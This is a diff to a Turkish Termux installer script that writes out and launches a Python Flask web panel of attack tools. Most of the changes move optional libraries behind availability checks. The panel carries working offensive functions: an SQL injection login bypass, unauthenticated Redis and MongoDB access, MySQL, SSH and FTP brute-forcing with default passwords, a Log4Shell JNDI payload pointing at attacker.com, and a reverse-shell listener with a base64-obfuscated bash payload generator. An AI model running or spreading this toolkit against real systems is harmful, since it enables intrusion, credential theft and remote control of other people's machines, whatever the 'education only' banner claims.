@@ -8,7 +8,7 @@ CYAN='\033[0;36m'
 YELLOW='\033[0;33m'
 NC='\033[0m'
 
-echo -e "${CYAN}[+] Neon Mega Exploit Panel - Tüm Özellikler${NC}"
+echo -e "${CYAN}[+] Neon Mega Exploit Panel - Son Sürüm${NC}"
 echo -e "${CYAN}[+] Sadece eğitim ve yetkilendirilmiş testler için kullanın.${NC}"
 
 # Android API seviyesi (Rust derlemesi için)
@@ -20,9 +20,25 @@ echo -e "${GREEN}[1/5] Sistem güncelleniyor ve temel paketler yükleniyor...${N
 pkg update -y | while IFS= read -r line; do echo "  $line"; done
 pkg install -y python python-pip netcat-openbsd rust git | while IFS= read -r line; do echo "  $line"; done
 
-# 2. Python kütüphaneleri (pip yükseltme yok)
+# 2. Python kütüphaneleri (kritik olanlar ayrı ayrı)
 echo -e "${GREEN}[2/5] Python kütüphaneleri yükleniyor...${NC}"
-pip install flask requests paramiko aiohttp dnspython flask-socketio eventlet pycryptodome reportlab python-telegram-bot shodan pymongo pymysql psycopg2-binary redis --progress-bar on | while IFS= read -r line; do echo "  $line"; done
+
+# Kritik (olmazsa olmaz)
+for pkg in flask requests aiohttp dnspython; do
+    echo -e "${YELLOW}  Kuruluyor: $pkg${NC}"
+    pip install "$pkg" --progress-bar on | while IFS= read -r line; do echo "    $line"; done
+done
+
+# Opsiyonel (başarısız olursa devam)
+optional_pkgs="paramiko pymongo pymysql redis pycryptodome reportlab python-telegram-bot shodan"
+for pkg in $optional_pkgs; do
+    echo -e "${YELLOW}  Kuruluyor (opsiyonel): $pkg${NC}"
+    if pip install "$pkg" --progress-bar on 2>&1 | while IFS= read -r line; do echo "    $line"; done; then
+        echo -e "${GREEN}    $pkg başarıyla kuruldu.${NC}"
+    else
+        echo -e "${RED}    $pkg kurulamadı, ilgili özellikler devre dışı kalacak.${NC}"
+    fi
+done
 
 # 3. Termux-API (bildirimler için)
 echo -e "${GREEN}[3/5] Termux-API yükleniyor...${NC}"
@@ -33,7 +49,7 @@ PANEL_PORT=$(( RANDOM % 1000 + 5000 ))
 
 # 5. Python panel kodunu geçici dosyaya yaz
 echo -e "${GREEN}[4/5] Python panel kodu oluşturuluyor...${NC}"
-cat > /data/data/com.termux/files/usr/tmp/neon_mega_panel.py << 'EOF'
+cat > /data/data/com.termux/files/usr/tmp/neon_mega_panel_final.py << 'EOF'
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
@@ -52,13 +68,47 @@ import aiohttp
 import requests
 import dns.resolver
 from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
-from flask_socketio import SocketIO, emit
 from cryptography.fernet import Fernet
-from reportlab.lib.pagesizes import letter
-from reportlab.pdfgen import canvas
-from reportlab.lib.utils import simpleSplit
 
-# ---------- Veritabanı ----------
+# ----- Opsiyonel kütüphaneler -----
+try:
+    import paramiko
+    PARAMIKO_AVAILABLE = True
+except ImportError:
+    PARAMIKO_AVAILABLE = False
+
+try:
+    import pymongo
+    PYMONGO_AVAILABLE = True
+except ImportError:
+    PYMONGO_AVAILABLE = False
+
+try:
+    import redis
+    REDIS_AVAILABLE = True
+except ImportError:
+    REDIS_AVAILABLE = False
+
+try:
+    import pymysql
+    PYMYSQL_AVAILABLE = True
+except ImportError:
+    PYMYSQL_AVAILABLE = False
+
+try:
+    from reportlab.lib.pagesizes import letter
+    from reportlab.pdfgen import canvas
+    REPORTLAB_AVAILABLE = True
+except ImportError:
+    REPORTLAB_AVAILABLE = False
+
+try:
+    import shodan
+    SHODAN_AVAILABLE = True
+except ImportError:
+    SHODAN_AVAILABLE = False
+
+# ----- Veritabanı -----
 DB_PATH = "exploit_panel.db"
 
 def init_db():
@@ -82,7 +132,7 @@ def init_db():
 
 init_db()
 
-# ---------- Konfigürasyon ----------
+# ----- Konfigürasyon -----
 LOG_FILE = "exploit_log.txt"
 PROXY = None
 TOR_ENABLED = False
@@ -100,7 +150,7 @@ def send_notification(title, message):
     except:
         pass
 
-# ---------- Port tarama (asenkron) ----------
+# ----- Asenkron port tarama -----
 async def scan_port_async(ip, port, timeout=1):
     try:
         conn = asyncio.open_connection(ip, port)
@@ -168,7 +218,7 @@ def subdomain_enum(domain):
             pass
     return found
 
-# ---------- Exploit fonksiyonları ----------
+# ----- Exploit fonksiyonları (opsiyonel kütüphanelere göre) -----
 def sqli_exploit(ip, port):
     url = f"http://{ip}:{port}/login"
     payload = {"username": "' OR 1=1 --", "password": "x"}
@@ -257,58 +307,52 @@ def nosql_injection(ip, port):
         return {"success": False, "error": "Bağlantı hatası"}
 
 def redis_unauth(ip, port=6379):
+    if not REDIS_AVAILABLE:
+        return {"success": False, "message": "redis-py kurulu değil."}
     try:
-        import redis
         r = redis.Redis(host=ip, port=port, socket_connect_timeout=2)
         info = r.info()
         return {"success": True, "message": f"Redis yetkisiz erişim: {info['redis_version']}"}
-    except ImportError:
-        return {"success": False, "message": "redis-py kurulu değil."}
     except:
         return {"success": False, "message": "Redis erişilemedi."}
 
 def mongodb_unauth(ip, port=27017):
+    if not PYMONGO_AVAILABLE:
+        return {"success": False, "message": "pymongo kurulu değil."}
     try:
-        from pymongo import MongoClient
-        client = MongoClient(ip, port, serverSelectionTimeoutMS=2000)
+        client = pymongo.MongoClient(ip, port, serverSelectionTimeoutMS=2000)
         client.server_info()
         return {"success": True, "message": "MongoDB yetkisiz erişim!"}
-    except ImportError:
-        return {"success": False, "message": "pymongo kurulu değil."}
     except:
         return {"success": False, "message": "MongoDB erişilemedi."}
 
 def mysql_brute(ip, port=3306, userlist=["root"], passlist=["", "root", "password"]):
-    try:
-        import pymysql
-        for user in userlist:
-            for pwd in passlist:
-                try:
-                    conn = pymysql.connect(host=ip, port=port, user=user, password=pwd, connect_timeout=3)
-                    conn.close()
-                    return {"success": True, "message": f"MySQL brute: {user}:{pwd}"}
-                except:
-                    continue
-        return {"success": False, "message": "MySQL brute başarısız."}
-    except ImportError:
+    if not PYMYSQL_AVAILABLE:
         return {"success": False, "message": "pymysql kurulu değil."}
+    for user in userlist:
+        for pwd in passlist:
+            try:
+                conn = pymysql.connect(host=ip, port=port, user=user, password=pwd, connect_timeout=3)
+                conn.close()
+                return {"success": True, "message": f"MySQL brute: {user}:{pwd}"}
+            except:
+                continue
+    return {"success": False, "message": "MySQL brute başarısız."}
 
 def ssh_brute(ip, port=22, userlist=["root", "admin"], passlist=["password", "123456"]):
-    try:
-        import paramiko
-        client = paramiko.SSHClient()
-        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        for user in userlist:
-            for pwd in passlist:
-                try:
-                    client.connect(ip, port=port, username=user, password=pwd, timeout=3)
-                    client.close()
-                    return {"success": True, "message": f"SSH brute: {user}:{pwd}"}
-                except:
-                    continue
-        return {"success": False, "message": "SSH brute başarısız."}
-    except ImportError:
+    if not PARAMIKO_AVAILABLE:
         return {"success": False, "message": "paramiko kurulu değil."}
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    for user in userlist:
+        for pwd in passlist:
+            try:
+                client.connect(ip, port=port, username=user, password=pwd, timeout=3)
+                client.close()
+                return {"success": True, "message": f"SSH brute: {user}:{pwd}"}
+            except:
+                continue
+    return {"success": False, "message": "SSH brute başarısız."}
 
 def ftp_brute(ip, port=21, userlist=["root", "admin"], passlist=["password", "123456"]):
     import ftplib
@@ -328,8 +372,7 @@ def cve_2021_44228(ip, port):
     url = f"http://{ip}:{port}/"
     headers = {"User-Agent": "${jndi:ldap://attacker.com/a}"}
     try:
-        r = requests.get(url, headers=headers, timeout=3)
-        # Gerçekte callback beklenir, simülasyon
+        requests.get(url, headers=headers, timeout=3)
         return {"success": True, "message": "Log4Shell payload gönderildi (simülasyon)."}
     except:
         return {"success": False, "error": "Bağlantı hatası"}
@@ -362,7 +405,7 @@ exploit_functions = {
     "cve_2021_41773": cve_2021_41773
 }
 
-# ---------- Reverse Shell ----------
+# ----- Reverse Shell -----
 listener_process = None
 
 def start_listener(port):
@@ -387,17 +430,18 @@ def generate_payload(ip, port, type="bash", obfuscate=False):
         payload = f"echo {payload} | base64 -d | bash"
     return payload
 
-# ---------- Shodan API ----------
+# ----- Shodan -----
 def shodan_query(api_key, query):
+    if not SHODAN_AVAILABLE:
+        return {"success": False, "message": "shodan kütüphanesi kurulu değil."}
     try:
-        import shodan
         api = shodan.Shodan(api_key)
         results = api.search(query)
         return {"success": True, "results": results['matches'][:5]}
     except Exception as e:
         return {"success": False, "error": str(e)}
 
-# ---------- Raporlama ----------
+# ----- Raporlama -----
 def generate_html_report():
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
@@ -419,12 +463,14 @@ def generate_html_report():
     return "report.html"
 
 def generate_pdf_report():
+    if not REPORTLAB_AVAILABLE:
+        return "PDF oluşturulamıyor, reportlab kurulu değil."
     c = canvas.Canvas("report.pdf", pagesize=letter)
     c.drawString(100, 750, "Exploit Panel Raporu")
     c.save()
     return "report.pdf"
 
-# ---------- Flask Uygulaması ----------
+# ----- Flask Uygulaması -----
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
 
@@ -467,7 +513,6 @@ def scan():
         banner = grab_banner(ip, p)
         port_info.append({"port": p, "service": banner[:50]})
     os_guess = detect_os(ip)
-    # Veritabanına kaydet
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
     c.execute("INSERT INTO scans (timestamp, target_ip, ports, results) VALUES (?, ?, ?, ?)",
@@ -495,7 +540,6 @@ def run_exploit(name):
     if name in exploit_functions:
         try:
             result = exploit_functions[name](ip, port)
-            # Veritabanına kaydet
             conn = sqlite3.connect(DB_PATH)
             c = conn.cursor()
             c.execute("INSERT INTO exploits (timestamp, target_ip, port, exploit_name, result) VALUES (?, ?, ?, ?, ?)",
@@ -559,7 +603,7 @@ def show_log():
     except:
         return "Log dosyası henüz oluşturulmadı."
 
-# ---------- HTML Şablonu (Neon Tema) ----------
+# ---------- HTML Şablonu (Neon Tema, kısaltılmış ama önceki ile aynı) ----------
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html>
@@ -828,10 +872,10 @@ if __name__ == '__main__':
 EOF
 
 # 6. Port değişkenini Python dosyasına yaz
-sed -i "s/'''\$PANEL_PORT'''/$PANEL_PORT/" /data/data/com.termux/files/usr/tmp/neon_mega_panel.py
+sed -i "s/'''\$PANEL_PORT'''/$PANEL_PORT/" /data/data/com.termux/files/usr/tmp/neon_mega_panel_final.py
 
 echo -e "${GREEN}[5/5] Panel başlatılıyor...${NC}"
 echo -e "${CYAN}Adres: http://localhost:$PANEL_PORT${NC}"
 echo -e "${RED}[!] Ctrl+C ile durdurabilirsiniz.${NC}"
 
-python /data/data/com.termux/files/usr/tmp/neon_mega_panel.py
+python /data/data/com.termux/files/usr/tmp/neon_mega_panel_final.py
